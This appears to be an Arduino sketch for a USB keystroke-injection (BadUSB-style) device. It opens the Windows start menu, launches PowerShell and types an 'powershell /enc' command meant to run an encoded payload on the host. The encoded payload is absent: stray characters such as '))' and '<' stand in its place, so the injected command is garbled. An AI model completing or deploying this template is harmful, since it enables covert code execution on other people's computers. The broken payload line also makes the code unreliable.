#include <Keyboard.h>


void shell() {
  Keyboard.print("powershell ");
  Keyboard.write('/');
  Keyboard.print("enc ");
  Keyboard.write(')');
  Keyboard.write(')');

  Keyboard.print("<");
  Keyboard.print(" exit");

}

void setup() {
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  // Keyboard.press(114);
  Keyboard.releaseAll();
  
  delay(1000);
  Keyboard.print("powershell");
  delay(100);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  delay(1500);

  shell();

  delay(500);
  
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
}

